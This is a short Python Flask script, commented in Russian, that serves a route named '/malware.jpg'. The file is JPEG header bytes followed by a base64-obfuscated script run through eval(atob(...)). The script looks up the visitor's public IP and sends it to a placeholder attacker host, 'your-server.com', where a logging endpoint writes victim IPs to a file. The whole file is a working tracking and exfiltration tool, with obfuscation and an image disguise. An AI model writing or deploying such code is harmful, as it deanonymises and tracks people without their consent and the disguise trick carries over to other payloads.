from flask import Flask, Response, request
import base64

app = Flask(__name__)

# JS получает публичный IP через внешний API и отправляет
js_code = """
fetch('https://api.ipify.org?format=json')
    .then(r => r.json())
    .then(data => {
        fetch('http://your-server.com:8080/log?ip=' + data.ip);
    });
"""

b64 = base64.b64encode(js_code.encode()).decode()
payload = f"<script>eval(atob('{b64}'))</script>"
jpg = bytes([0xFF, 0xD8, 0xFF, 0xE0]) + payload.encode()

@app.route('/malware.jpg')
def malware():
    return Response(jpg, mimetype='image/jpeg')

@app.route('/log')
def log():
    ip = request.args.get('ip', '')
    victim_ip = request.remote_addr
    
    print(f"[+] IP from API: {ip}")
    print(f"[+] Direct IP: {victim_ip}")
    
    with open('ips.txt', 'a') as f:
        f.write(f"{victim_ip} | {ip}\n")
    
    return '', 204

app.run(host='0.0.0.0', port=8080)